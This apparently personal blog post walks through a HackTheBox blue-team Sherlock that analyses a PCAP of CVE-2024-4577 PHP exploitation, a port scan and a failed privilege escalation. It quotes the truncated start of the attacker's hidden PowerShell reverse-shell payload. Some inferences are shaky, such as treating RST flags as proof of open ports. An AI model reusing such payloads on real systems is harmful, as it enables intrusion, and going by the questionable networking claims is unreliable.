---
layout: page
title: HTB Sherlock Packet Puzzle
description: Blue Team CTF
img: assets/img/packet.puzzle.11.JPG
importance: 1
category: work
related_publications: true
---

Hello everyone and welcome to my first HTB Sherlock walkthrough, Today I will be going through Packet Puzzle. This Sherlock has us exploring through a PCAP file to analyse if an environment was compromised and go through the attackers actions.

**What is the source IP address of the attacker involved in this Attack?**
For the following Sherlock I am using Wireshark to analyse the PCAP file. I have started by putting in a filter for HTTP.REQUESTS, through this I discovered a GET request for a file nc64.exe which I thought was suspicious. I then did a quick google search to determine that this was a Netcat tool. From this I concluded that the IP 192.168.170.128 was the malicious actor.
![Screenshot1](assets/img/packet_puzzle.1.png)


**How many open ports did the attacker discover on the victim's system?**
As I have determined that the malicious IP Address is 192.168.170.128 I completed a search using the attackers IP address and the defenders IP address. I discovered 8 RST Flags which would have confirmed to the attacker that the ports were open.
![Screenshot1](assets/img/packet_puzzle.2.png)

**What is the first open port that responded on the victim's system during reconnaissance?**
By looking at the timestamps we can confirm that the first port that responded was port 22.
![Screenshot1](assets/img/packet_puzzle.3.png)


**What is the CVE identifier for the vulnerability exploited by the attacker?**
CVE-2024-4577 was a vulnerability that interprets characters as PHP options, as seen in the wireshark logs.
![Screenshot1](assets/img/packet_puzzle.4.png)

**What is the name and version of the vulnerable product exploited to get RCE?**
As the CVE identified is related to a PHP vulnerability we can determine that the product is a PHP server. Through following the TCP stream on a post request we can determine what specific version of PHP was running.
![Screenshot1](assets/img/packet_puzzle.5.png)


**What is the username of the victim account?**
By using Follow TCP stream we can see that the attackers command was successful and shows its execution.
![Screenshot1](assets/img/packet_puzzle.6.png)


**At what timestamp did the attacker execute the command to gain their initial foothold on the victim system?**
As we go further down the Wireshark logs we can see that a POST request was sent including the following command <?php system('powershell -NoP -NonI Hidden -Exec Bypass -Command "$client which would have given the attacker a foothold on the system. We then look at the frame data and the UTC Arrival time.
![Screenshot1](assets/img/packet_puzzle.7.png)

**What is the MITRE ATT&CK technique ID used by the attacker to gain an initial foothold?**
T1190  would be the attack ID for an attacker getting initial access. T1190 relates to exploiting a public facing application E.G PHP website.

**What is the name of the malicious executable the attacker downloaded and executed in memory to facilitate privilege escalation on the endpoint?**
Through isolating traffic to port 80 and using TCP as the commands would not be through HTTP but through powershell and after much trial and error I was able to identify the correct stream and can see that EXE downloaded for privilege escalation. 
![Screenshot1](assets/img/packet_puzzle.8.png)


**What is the command line used by the attacker while performing privilege escalation?**
Through further investigation I uncovered the command used by the adversary to attempt to perform privilege escalation. I believe that the downloaded file was TimeProvider.exe as this exploits windows time service for the program to be run.
![Screenshot1](assets/img/packet_puzzle.9.png)


**The attacker failed to escalate privileges and was given an error. What is the error?**
We can see that attack failed as the error message 'Cannot create process Win32Error:2' was identified. 
![Screenshot1](assets/img/packet_puzzle.10.png)

**Summary**
This Sherlock was a lot of fun and has given me insight on how much I need to improve my wireshark skills. I believe I need a refresher on HTTP codes as well as networking before I give another one a go. Thank you for reading




```

{% endraw %}
